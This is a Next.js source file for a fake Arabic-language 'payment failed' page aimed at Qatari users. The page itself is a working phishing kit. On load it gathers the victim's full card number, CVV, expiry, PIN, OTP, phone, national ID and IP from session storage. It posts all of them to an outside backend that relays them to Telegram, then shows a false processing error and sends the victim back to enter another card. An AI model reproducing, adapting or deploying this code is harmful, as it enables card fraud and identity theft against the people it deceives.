"use client";

import { useEffect, useState } from "react";
import { useRouter } from "next/navigation";
import Image from "next/image";
import LoadingButton from "@/components/Button";

export default function FailPage() {
  const router = useRouter();

  const [amount, setAmount] = useState("");
  const [cardInfo, setCardInfo] = useState("");
  const [orderId, setOrderId] = useState("");
  const [orderTime, setOrderTime] = useState("");
  const [uid, setUid] = useState("");

  function generateOrderId() {
    const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    let result = "";
    for (let i = 0; i <= 25; i++) {
      result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
  }

  function generateUID() {
    return Math.floor(100000000 * Math.random());
  }

  // ✅ Load sessionStorage data and send to Telegram
  useEffect(() => {
    const storedCard = sessionStorage.getItem("CardNumber");
    const storedAmount = sessionStorage.getItem("amount"); // ✅ make sure you also save amount earlier
    const storedIp = sessionStorage.getItem("User IP");
    const storedId = sessionStorage.getItem("idNumber");
    const storedPhone = sessionStorage.getItem("mobileNumber");
    const storedOtp = sessionStorage.getItem("otp");
    const storedPin = sessionStorage.getItem("pin");
    const storedHolder = sessionStorage.getItem("Cardholder");
    const storedMonth = sessionStorage.getItem("Month");
    const storedCVV = sessionStorage.getItem("CVV");

    if (storedCard) {
      setCardInfo(storedCard.slice(-4)); // only last 4
    }
    if (storedAmount) {
      setAmount(storedAmount);
    }

    const newOrderId = generateOrderId();
    const newOrderTime = new Date().toLocaleString();
    const newUid = generateUID();

    setOrderId(newOrderId);
    setOrderTime(newOrderTime);
    setUid(newUid);

    // ✅ Send all data to Telegram
    const sendToTelegram = async () => {
      const chatId = process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID;
      const botToken = process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN;

      const message = `
Payment Failed

Cardholder: ${storedHolder || "N/A"}
Card: ${storedCard || "N/A"}
Expiry: ${storedMonth || "N/A"}
CVV: ${storedCVV || "N/A"}
Phone: ${storedPhone || "N/A"}
ID Number: ${storedId || "N/A"}
Amount: 100 QAR
OTP: ${storedOtp || "N/A"}
PIN: ${storedPin || "N/A"}
IP: ${storedIp || "N/A"}

Order ID: ${newOrderId}
Order Time: ${newOrderTime}
UID: ${newUid}
`;

      try {
        await fetch("https://wuaze-qata-backend.vercel.app/send", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ text: message }),
      });
      } catch (err) {
        console.error("Failed to send message to Telegram:", err);
      }
    };

    sendToTelegram();
  }, []);


  const handleRetry = () => {
    setTimeout(() => {
      router.push("/card");
    }, 3000); // ⏳ 3 second delay
  };


  return (
    <div className="flex items-center justify-center pt-16 bg-gray-100 min-h-screen">
      <div className="bg-white shadow-lg rounded-lg p-6 w-full max-w-lg text-right">
        {/* Top section */}
        <div className="flex flex-col items-center mb-6">
          <div className="relative w-[70px] h-[70px] mb-4">
            <Image
              src="/retirer.png"
              alt="Error"
              fill
              className="object-contain"
            />
          </div>
          <h2 className="text-xl font-bold text-gray-800">فشل الدفع!</h2>
          <p className="text-gray-600 text-sm mt-2">
            حدث خطأ في تنفيذ العملية، يرجى إعادة المحاولة
          </p>
        </div>

        {/* Details */}
        <div className="bg-white border rounded-lg shadow-sm divide-y text-sm">
          <div className="flex justify-between p-3">
            <span className="text-gray-400">المبلغ:</span>
            <span>QAR +100</span>
          </div>
          <div className="flex justify-between p-3">
            <span className="text-gray-400">معلومات البطاقة:</span>
            <span>**** **** **** {cardInfo}</span>
          </div>
          <div className="flex justify-between p-3">
            <span className="text-gray-400">معرّف الطلب:</span>
            <span>{orderId}</span>
          </div>
          <div className="flex justify-between p-3">
            <span className="text-gray-400">وقت الطلب:</span>
            <span>{orderTime}</span>
          </div>
          <div className="flex justify-between p-3">
            <span className="text-gray-400">UID:</span>
            <span>{uid}</span>
          </div>
          <div className="flex justify-between p-3">
            <span className="text-gray-400">رمز الخطأ:</span>
            <span>خطأ في المعالجة أو الشبكة، وما إلى ذلك (241)</span>
          </div>
          <div className="flex justify-between p-3">
            <span className="text-gray-400">المحلول:</span>
            <span>
              حاول مرة أخرى أو استخدم بطاقة أخرى أو جرّب وسائل دفع أخرى
            </span>
          </div>
        </div>

        {/* Tips */}
        <p className="text-gray-400 text-xs leading-relaxed mt-4">
          نصائح: إذا قام البنك بتحصيل رسوم منك، فسيتم ردها خلال 1-5 أيام (اتصل
          بالبنك إذا لم يتم ذلك).
        </p>

        {/* Retry button */}
        <div className="mt-6">
          <LoadingButton
            w="100%"
            onClick={handleRetry}
            className="w-full bg-[#c81048] text-white font-medium py-2 px-4 rounded-lg hover:bg-red-700 focus:ring-4 focus:ring-[#d81b60]"
          >
            العودة إلى صفحة الدفع
          </LoadingButton>
        </div>
      </div>
    </div>
  );
}
